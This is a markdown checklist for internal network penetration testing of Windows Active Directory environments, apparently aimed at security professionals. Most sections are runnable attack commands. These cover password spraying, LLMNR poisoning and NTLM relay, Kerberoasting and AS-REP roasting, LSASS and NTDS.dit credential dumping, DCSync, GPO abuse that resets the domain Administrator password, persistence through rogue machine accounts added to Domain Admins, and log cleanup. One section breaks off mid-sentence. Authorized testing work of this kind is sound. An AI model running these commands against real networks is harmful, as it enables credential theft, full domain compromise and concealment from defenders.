# Internal Network Penetration Testing Checklist

> This checklist provides a structured approach to internal network penetration testing, helping security professionals methodically identify and exploit vulnerabilities within an organization's network infrastructure. Each section outlines specific techniques, tools, and commands to effectively assess security posture from an attacker's perspective.

## Table of Contents
- [1. Reconnaissance & Initial Enumeration](#1-reconnaissance--initial-enumeration)
- [2. Network Scanning](#2-network-scanning)
- [3. Unauthenticated Enumeration](#3-unauthenticated-enumeration)
- [4. Initial Access & Foothold](#4-initial-access--foothold)
- [5. Authenticated Enumeration](#5-authenticated-enumeration)
- [6. Local Privilege Escalation](#6-local-privilege-escalation)
- [7. Lateral Movement](#7-lateral-movement)
- [8. Domain Privilege Escalation](#8-domain-privilege-escalation)
- [9. Domain Persistence](#9-domain-persistence)
- [10. Post-Exploitation & Data Collection](#10-post-exploitation--data-collection)
- [11. Cleanup](#11-cleanup)

## 1. Reconnaissance & Initial Enumeration

> Reconnaissance is the critical first phase where you gather information about the target environment. The goal is to understand the network topology, identify active systems, determine domain structure, and discover potential entry points without alerting security monitoring systems.

### Physical Network Reconnaissance
- [ ] Check for physical network ports
  - Look for unlabeled or unsecured network jacks that might provide access
  - Check for network ports in public/common areas that might be overlooked
- [ ] Document subnet information from network jack labels
  - Network jacks often have labels indicating VLAN, subnet, or location information
- [ ] Identify network devices (printers, IP phones, etc.)
  - These devices often run outdated firmware and may have default credentials

### System Information Gathering
- [ ] Identify your current network configuration
  ```bash
  ipconfig /all         # Windows
  ifconfig -a           # Linux/Unix
  ip addr show          # Modern Linux
  ```
- [ ] Check current system privileges and user context
  ```bash
  whoami                # Current username
  whoami /priv          # Current privileges (Windows)
  whoami /groups        # Group memberships (Windows)
  id                    # User and group info (Linux)
  ```
- [ ] Gather local system information
  ```bash
  systeminfo            # Windows system info
  hostname              # Computer name
  net config workstation # Windows network configuration
  uname -a              # Linux system info
  cat /etc/os-release   # Linux distribution info
  ```

### Network Scope Identification
- [ ] Gather network range information
  ```bash
  # Linux network info
  nmcli dev show eth0
  ip addr show
  cat /etc/resolv.conf
  route -n              # Routing table
  netstat -rn           # Routing table alternative
  
  # Windows network info
  ipconfig /all
  route print
  netsh interface show interface
  ```
- [ ] Identify domain information
  ```bash
  # Windows domain info
  echo %USERDOMAIN%     # Current domain
  systeminfo | findstr /B /C:"Domain"
  nltest /dcname:domain # Find domain controller
  set                   # Environment variables including domain
  
  # Linux domain discovery
  nmblookup -A <IP>     # NetBIOS name lookup
  smbclient -L //<IP>   # List SMB shares
  ```
- [ ] Find domain controller IP
  ```bash
  nslookup -type=SRV _ldap._tcp.dc._msdcs.<domainName>
  nslookup -type=SRV _kerberos._tcp.dc._msdcs.<domainName>
  ```
- [ ] Discover neighboring hosts from your system
  ```bash
  # Windows
  arp -a                # ARP cache
  ping -n 1 <IP>        # Test connectivity
  
  # Linux
  arp -n                # ARP cache
  ip neigh              # Neighbor cache
  ```

## 2. Network Scanning

> Network scanning helps identify live hosts and open services across the network. This phase builds a comprehensive map of the attack surface by discovering systems and their potential vulnerabilities based on exposed services.

### Host Discovery
- [ ] ARP scan for live hosts
  ```bash
  arp-scan -l                     # Scan local subnet
  netdiscover -r 10.10.10.0/24    # Discover hosts in subnet
  ```
  - *Why*: ARP scanning is fast and stealthy, often bypassing firewall restrictions
  - *What to look for*: Identify live hosts, network devices, and potential targets

- [ ] ICMP sweep for live hosts
  ```bash
  nmap -sn 10.10.10.0/24 -oA ping_sweep
  fping -a -g 10.10.10.0/24 2>/dev/null
  ```
  - *Why*: ICMP helps identify hosts that respond to ping requests
  - *What to look for*: Systems that allow ICMP traffic may indicate less restrictive security

- [ ] NetBIOS and SMB discovery
  ```bash
  nbtscan -r 10.10.10.0/24        # NetBIOS name scanning
  crackmapexec smb 10.10.10.0/24  # SMB scanning with version info
  ```
  - *Why*: Identifies Windows systems and their information
  - *What to look for*: Computer names, domains, and workgroups

### Port Scanning
- [ ] Targeted service scans
  ```bash
  # Domain Controllers
  nmap -p 53,88,389,445,636,3268,3269 -sV <targets>
  ```
  - *Why*: Domain controllers run specific services (DNS, Kerberos, LDAP, SMB)
  - *What to look for*: Domain infrastructure and potential attack vectors for AD
  
  ```bash
  # Web Applications
  nmap -p 80,443,8080,8443 -sV <targets>
  ```
  - *Why*: Web applications often contain vulnerabilities
  - *What to look for*: Web server types, versions, and potential misconfigurations
  
  ```bash
  # Database Servers
  nmap -p 1433,1521,3306,5432 -sV <targets>
  ```
  - *Why*: Databases contain sensitive information and may have default credentials
  - *What to look for*: Database types (MSSQL, Oracle, MySQL, PostgreSQL) and versions
  
  ```bash
  # Critical Services
  nmap -p 21,22,23,25,110,111,135,139,445,3389 -sV <targets>
  ```
  - *Why*: These services often have vulnerabilities or can be used for lateral movement
  - *What to look for*: Outdated versions, unencrypted protocols, and RDP access

- [ ] Comprehensive port scan
  ```bash
  nmap -p- -T4 --min-rate 1000 -sV <target> -oA fullscan
  ```
  - *Why*: Ensures all open ports are discovered, revealing the complete attack surface
  - *What to look for*: Unexpected open ports, non-standard services, and misconfigurations

- [ ] Scan for sensitive/vulnerable services
  ```bash
  # Check for unencrypted protocols
  nmap -p 21,23,25,80,110,143,389 --open <targets> -oN unencrypted_protocols
  ```
  - *Why*: Unencrypted protocols allow credential interception
  - *What to look for*: FTP, Telnet, HTTP, SMTP, POP3, IMAP, and LDAP services
  
  ```bash
  # Scan for WSUS (Windows Update) services
  nmap -p 8530,8531 <targets>
  ```
  - *Why*: Misconfigured WSUS can be exploited for privilege escalation
  - *What to look for*: WSUS services running without SSL/TLS (port 8530)
  
  ```bash
  # Quick wins - vulnerable services
  nmap -p 8080,1098,1099,1050,8000,8888,8008,9010,7001 <targets> -oN quickwins.txt -sV
  ```
  - *Why*: These ports often host vulnerable applications (Tomcat, JBoss, WebLogic)
  - *What to look for*: Administrative interfaces, outdated versions, and default credentials

## 3. Unauthenticated Enumeration

> Unauthenticated enumeration involves gathering information without valid credentials. This phase focuses on identifying misconfigurations, vulnerabilities in services, and potential user accounts that can be leveraged for initial access.

### OS Information Gathering
- [ ] Identify operating systems and versions
  ```bash
  nmap -O <targets>
  nmap -sV --script banner <targets>
  ```
  - *Why*: Different operating systems and versions have known vulnerabilities
  - *What to look for*: End-of-life systems (Windows 7, Server 2008/2003), unpatched systems

### Service Enumeration
- [ ] Enumerate SMBv1 (vulnerable version)
  ```bash
  crackmapexec smb <targets> | grep -a "SMBv1:True"
  nmap --script smb-protocols <target>
  ```
  - *Why*: SMBv1 is vulnerable to attacks like EternalBlue (MS17-010)
  - *What to look for*: Systems running outdated SMB protocol versions

- [ ] Check SMB signing
  ```bash
  crackmapexec smb <targets> | grep -a "signing:False"
  ```
  - *Why*: Without SMB signing, attackers can perform SMB relay attacks
  - *What to look for*: Systems where SMB signing is disabled or not required

- [ ] Check for unsupported OS versions
  ```bash
  crackmapexec smb <targets> | egrep -a "Windows 6.1|Server 2008|Server 2003|Windows 7|Server \(R\) 2008"
  ```
  - *Why*: Unsupported systems don't receive security updates
  - *What to look for*: Deprecated OS versions that are vulnerable to known exploits

- [ ] Check RDP security settings
  ```bash
  rdp-sec-check.pl <target>
  ```
  - *Why*: Insecure RDP configurations can be exploited for access
  - *What to look for*: RDP without Network Level Authentication (NLA), weak encryption

- [ ] Check web servers for information disclosure
  ```bash
  nikto -h http://<target>
  whatweb http://<target>
  ```
  - *Why*: Web servers often leak information about the environment
  - *What to look for*: Server headers, version information, default pages

### Unauthenticated User Enumeration
- [ ] RPC/SMB null session enumeration
  ```bash
  rpcclient -U '' -N <target>
  rpcclient $> enumdomusers
  rpcclient $> querygroupmem 0x200
  ```
  - *Why*: Null sessions allow anonymous access to system information
  - *What to look for*: User accounts, group memberships, and domain information

- [ ] LDAP anonymous binding
  ```bash
  ldapsearch -x -h <target> -D '' -w '' -b "DC=domain,DC=local"
  ```
  - *Why*: Misconfigured LDAP servers may allow anonymous queries
  - *What to look for*: User accounts, computer accounts, group information

- [ ] Kerberos user enumeration (check for valid users)
  ```bash
  kerbrute userenum -d domain.local --dc <DC_IP> users.txt
  ```
  - *Why*: Kerberos responses differ for valid vs. invalid usernames
  - *What to look for*: Valid domain usernames for password spraying attempts

- [ ] AS-REP Roasting (pre-authentication disabled accounts)
  ```bash
  GetNPUsers.py domain.local/ -usersfile users.txt -request -dc-ip <DC_IP> -format hashcat
  ```
  - *Why*: Accounts with Kerberos pre-authentication disabled are vulnerable
  - *What to look for*: Encrypted TGTs that can be cracked offline

## 4. Initial Access & Foothold

> Initial access involves gaining the first foothold in the target environment. This phase exploits weaknesses in authentication mechanisms, vulnerable services, and network protocols to establish a presence within the network.

### Authentication Bypass
- [ ] NAC Bypass (802.1x) techniques
  - [ ] Try different MAC addresses (VMWARE VM, Apple devices, network equipment)
    ```
    VMWARE VM: 00-0C-29-00-4B-3F
    Apple: F8:FF:C2:23:32:43
    ```
  - *Why*: Network Access Control systems may whitelist certain device types
  - *What to look for*: Successful network connectivity after MAC spoofing

- [ ] Check for open network ports without authentication
  - *Why*: Some networks have improperly secured network jacks
  - *What to look for*: Network ports in public areas or guest networks with internal access

### Password Attacks
- [ ] Password spray common passwords
  ```bash
  # With CrackMapExec
  crackmapexec smb <target> -u users.txt -p passwords.txt
  
  # Test username=password
  for user in $(cat users.txt); do crackmapexec smb <target> -u $user -p $user -d domain.local; done
  
  # Using Spray
  spray.sh -smb <target> users.txt seasons.txt 3 15 domain.local
  ```
  - *Why*: Users often use weak, predictable passwords
  - *What to look for*: Successful authentications, avoid account lockouts by limiting attempts
  
- [ ] Test default credentials on discovered services
  ```bash
  hydra -L users.txt -P passwords.txt <target> service
  ```
  - *Why*: Many services retain default credentials after installation
  - *What to look for*: Administrative interfaces, network devices, and applications

### Exploiting Specific Vulnerabilities
- [ ] Check for ZeroLogon vulnerability
  ```bash
  crackmapexec smb <target> -u 'user' -p 'password' -M zerologon
  ```
  - *Why*: ZeroLogon (CVE-2020-1472) allows domain controller compromise
  - *What to look for*: Vulnerable domain controllers that can be exploited

- [ ] Check for PrintNightmare vulnerability
  ```bash
  crackmapexec smb <target> -u 'user' -p 'password' -M printnightmare
  ```
  - *Why*: PrintNightmare (CVE-2021-34527) allows remote code execution
  - *What to look for*: Systems with Print Spooler service enabled

- [ ] Check for PetitPotam vulnerability
  ```bash
  crackmapexec smb <target> -u 'user' -p 'password' -M petitpotam
  ```
  - *Why*: PetitPotam can force authentication and lead to NTLM relay attacks
  - *What to look for*: Domain controllers vulnerable to MS-EFSRPC coercion

### Network Attack Vectors
- [ ] LLMNR/NBT-NS/mDNS Poisoning
  ```bash
  responder -I eth0 -wbF
  ```
  - *Why*: Windows systems broadcast name resolution requests when DNS fails
  - *What to look for*: Captured NetNTLM hashes from systems trying to resolve names

- [ ] NTLM Relay attack setup
  ```bash
  ntlmrelayx.py -t smb://<target> -smb2support
  ```
  - *Why*: Captured authentication attempts can be relayed to other services
  - *What to look for*: Services that don't require SMB signing, allowing credential relay

- [ ] WPAD attack
  ```bash
  responder -I eth0 -wFb
  ```
  - *Why*: Web Proxy Auto-Discovery can be poisoned to capture credentials
  - *What to look for*: Systems attempting to download proxy configurations

- [ ] IPv6 DNS Takeover
  ```bash
  mitm6 -d domain.local
  ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.domain.local --delegate-access
  ```
  - *Why*: Windows prioritizes IPv6 over IPv4, allowing DNS poisoning
  - *What to look for*: Systems using DHCPv6 that can be redirected to attacker-controlled DNS

### Common Misconfigurations
- [ ] Check for Group Policy Preference passwords
  ```bash
  crackmapexec smb <target> -u 'user' -p 'password' -M gpp_password
  crackmapexec smb <target> -u 'user' -p 'password' -M gpp_autologin
  ```
  - *Why*: Older Group Policy Preferences stored encrypted credentials in SYSVOL
  - *What to look for*: XML files containing encrypted passwords that can be decrypted

## 5. Authenticated Enumeration

> Once you have valid credentials, authenticated enumeration allows for deeper discovery of domain resources, configurations, and potential security misconfigurations. This phase builds a comprehensive map of the environment for targeting privilege escalation vectors.

### Domain Enumeration
- [ ] Get domain information
  ```bash
  nltest /domain_trusts
  nltest /trusted_domains
  nltest /dclist:<domain>
  ```
  - *Why*: Understanding the domain structure reveals trust relationships
  - *What to look for*: Trust relationships between domains that can be exploited

- [ ] Get domain controller information
  ```bash
  nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
  Get-ADDomainController -Filter *
  ```
  - *Why*: Domain controllers are high-value targets
  - *What to look for*: Domain controller roles (PDC, RODC) and locations

### Password Policy Enumeration
- [ ] Check domain password policy
  ```bash
  Get-ADDefaultDomainPasswordPolicy
  Get-ADFinedGrainedPasswordPolicy -Filter *
  crackmapexec smb <target> -u 'user' -p 'password' --pass-pol
  ```
  - *Why*: Understanding password policies helps craft password attacks
  - *What to look for*: Weak policies (short length, no complexity) and lockout thresholds

### User & Group Enumeration
- [ ] Enumerate domain users
  ```bash
  Get-ADUser -Filter * -Properties *
  net user /domain
  ```
  - *Why*: Building a comprehensive user list identifies potential targets
  - *What to look for*: Service accounts, admin accounts, and inactive accounts

- [ ] Find admin users
  ```bash
  net group "Domain Admins" /domain
  Get-ADGroupMember -Identity "Domain Admins" -Recursive
  ```
  - *Why*: Admin accounts provide privileged access to systems
  - *What to look for*: Users with excessive privileges and service accounts in admin groups

- [ ] Check users with AdminCount
  ```bash
  crackmapexec ldap <target> -u 'user' -p 'password' --admin-count
  Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount
  ```
  - *Why*: AdminCount=1 indicates current or former privileged accounts
  - *What to look for*: Regular user accounts with AdminCount=1 attribute

- [ ] Check Protected Users group
  ```bash
  Get-ADGroupMember -Identity "Protected Users"
  ```
  - *Why*: Protected Users have enhanced security (no NTLM, Kerberos restrictions)
  - *What to look for*: Important accounts that may require different attack strategies

- [ ] Identify service accounts
  ```bash
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```
  - *Why*: Service accounts often have valuable permissions and static passwords
  - *What to look for*: Service accounts with SPNs for Kerberoasting

### Network Share Enumeration
- [ ] Find accessible SMB shares
  ```bash
  crackmapexec smb <target> -u 'user' -p 'password' --shares
  smbmap -H <target> -u 'user' -p 'password'
  ```
  - *Why*: Network shares often

## 6. Local Privilege Escalation

### Service Vulnerabilities
- [ ] Check for Potato attack vectors
  ```powershell
  # For Windows 10 < 1809
  JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\whoami.txt" -t *
  
  # For Windows 10 >= 1809
  JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\temp\out.txt"
  ```

### Credential Access
- [ ] Check WDigest setting
  ```powershell
  reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
  
  # Enable WDigest (as an attacker)
  reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
  ```
- [ ] Check LSA Protection
  ```powershell
  reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
  ```

## 7. Lateral Movement

### Common Techniques
- [ ] Use PsExec for remote command execution
  ```bash
  # Impacket
  psexec.py domain/user:password@target
  
  # Metasploit
  use exploit/windows/smb/psexec
  ```
- [ ] Use WMI for remote execution
  ```bash
  # Impacket
  wmiexec.py domain/user:password@target
  
  # PowerShell
  Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\wmi.txt" -ComputerName target
  ```
- [ ] Remote execution via SMB
  ```bash
  smbexec.py domain/user:password@target
  ```
- [ ] Scheduled Task abuse
  ```bash
  # Impacket
  atexec.py domain/user:password@target "command"
  
  # PowerShell
  $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\temp\task.txt"
  $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
  Register-ScheduledTask -TaskName "Test" -Action $action -Trigger $trigger -User "System" -RunLevel Highest -Force
  ```

## 8. Domain Privilege Escalation

### Kerberos Attacks
- [ ] Kerberoasting attack
  ```bash
  # Find accounts with SPN
  Get-NetUser -SPN
  
  # Request and extract tickets
  GetUserSPNs.py -request -dc-ip <DC_IP> domain.local/user:password -outputfile kerberoast.txt
  
  # Crack hashes
  hashcat -m 13100 kerberoast.txt wordlist.txt
  ```
- [ ] AS-REP Roasting
  ```bash
  # Find accounts with pre-auth disabled
  Get-ADUser -Filter 'userAccountControl -band 4194304' -Properties userAccountControl
  
  # Request and extract tickets
  GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
  
  # Crack hashes
  hashcat -m 18200 asrep.txt wordlist.txt
  ```
- [ ] Timeroasting/Computer Spraying
  ```bash
  python3 timeroast.py <DC_IP> -o ntp_hashes
  hashcat -a 0 -m 31300 ntp_hashes ./wordlists/rockyou.txt
  ```

### ACL/DACL Exploitation
- [ ] Identify vulnerable ACLs with BloodHound
- [ ] Exploit ForceChangePassword right
  ```powershell
  # PowerView
  Set-DomainUserPassword -Identity TargetUser -Verbose
  
  # rpcclient
  rpcclient -U user <target>
  setuserinfo2 targetuser 23 'NewPass123!'
  ```
- [ ] Shadow Credentials attack
  ```bash
  # Add shadow credentials with Whisker
  Whisker.exe add /target:TargetUser /domain:domain.local /dc:DC_IP
  
  # Request TGT with certificate
  Rubeus.exe asktgt /user:TargetUser /certificate:MIIJmAIB... /password:SecretPass /domain:domain.local /dc:DC_IP
  ```

### Group Policy Object (GPO) Abuse
- [ ] Abuse vulnerable GPOs
  ```powershell
  SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password123 /domain" --GPOName "VULNERABLE GPO"
  ```

### ADCS Exploitation
- [ ] Find vulnerable certificate templates
  ```bash
  certipy find -u user@domain.local -p password -dc-ip <DC_IP>
  ```
- [ ] ESC1 exploitation (User authentication template)
  ```bash
  certipy req -u user@domain.local -p password -ca 'CA-NAME' -template 'User' -dc-ip <DC_IP>
  ```
- [ ] Obtain PFX certificate via NTLM relay
  ```bash
  certipy relay -target 'http://CA.domain.local'
  ```

### Trust Relationship Attacks
- [ ] Enumerate domain trusts
  ```bash
  nltest /domain_trusts
  Get-ADTrust -Filter *
  ```
- [ ] Exploit SID filtering issues
  ```bash
  getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/user:password
  ```

## 9. Domain Persistence

### Credential Access & Dumping
- [ ] DCSync attack (with appropriate rights)
  ```bash
  secretsdump.py domain/user:password@target
  ```
- [ ] Extract NTDS.dit
  ```bash
  # Volume Shadow Copy method
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
  
  # Extract hashes
  secretsdump.py -ntds ntds.dit -system system LOCAL
  ```
- [ ] Dump LSASS memory
  ```powershell
  # Mimikatz
  sekurlsa::logonpasswords
  
  # Lsassy
  lsassy -d domain.local -u user -p password <target>
  ```

### Persistence Techniques
- [ ] Machine Account Persistence
  ```powershell
  # Create machine account 
  Import-Module .\Powermad.ps1
  New-MachineAccount -MachineAccount newMachine01 -Domain domain.local -DomainController dc01.domain.local
  
  # Change userAccountControl to appear as DC
  Set-ADComputer newMachine01 -replace @{ "userAccountcontrol" = 8192 }
  
  # Add to privileged group
  net group "Domain Admins" newMachine01$ /add /domain
  ```
- [ ] Primary Group ID modification
  ```powershell
  Set-ADUser -Identity user -Replace @{'primaryGroupID'=512}
  ```
- [ ] Add SPN to admin account
  ```powershell
  Set-ADUser -Identity administrator -ServicePrincipalNames @{Add='nonexistant/WHATEVER'}
  ```

## 10. Post-Exploitation & Data Collection

### Sensitive Data Gathering
- [ ] Search for credentials in files
  ```powershell
  findstr /SI /M "password" *.xml *.ini *.txt *.config
  ```
- [ ] Extract browser credentials
- [ ] Extract email data

### User Data Collection
- [ ] Find sensitive documents
  ```powershell
  Get-ChildItem -Path C:\ -Include *.doc,*.pdf,*.xls,*.xlsx,*.docx -File -Recurse -ErrorAction SilentlyContinue
  ```
- [ ] Search for scripts, configuration files

### Password Audit & Reporting
- [ ] Check for weak passwords
  ```bash
  dpat.py -n ntds.dit -c hashcat.potfile -g "Domain Admins.txt" "Enterprise Admins.txt"
  ```
- [ ] Generate reports for credentials found

## 11. Cleanup

### Removing Artifacts
- [ ] Delete temporary files
- [ ] Remove created accounts
- [ ] Clean up logs
- [ ] Remove scheduled tasks

### Documentation
- [ ] Document all findings
- [ ] Prepare comprehensive report
  - [ ] Use PlumHound for BloodHound data visualization
  - [ ] Export discovered network architecture
  - [ ] Document vulnerabilities and exploits used

---

## Helpful Tools Summary

### Network Discovery & Enumeration
- Nmap - Network scanning
- CrackMapExec - Active Directory assessment
- BloodHound - Active Directory visualization
- Responder - LLMNR/NBT-NS/mDNS poisoning
- PowerView - PowerShell AD enumeration
- ldapdomaindump - LDAP domain information extraction
- Kerbrute - Kerberos account enumeration

### Authentication & Privilege Escalation
- Mimikatz - Windows credential extraction
- Rubeus - Kerberos ticket manipulation
- Impacket Suite - Various AD attack tools
- Hashcat - Password cracking
- JuicyPotato/JuicyPotatoNG - Windows local privilege escalation
- PowerSploit - PowerShell exploitation framework

### Active Directory Exploitation
- Certipy - ADCS exploitation
- NTLMRelayx - NTLM relay attacks
- PetitPotam/PrintNightmare - Coercion attacks
- GetNPUsers.py - AS-REP Roasting
- GetUserSPNs.py - Kerberoasting
- BloodyAD/PowerMad - AD object manipulation

### Post-Exploitation
- SecretsDump - NTDS extraction
- Lsassy - LSASS memory extraction
- adPEAS - AD privilege escalation helper
- DPAT - Domain Password Audit Tool
- PlumHound - BloodHound data reporting
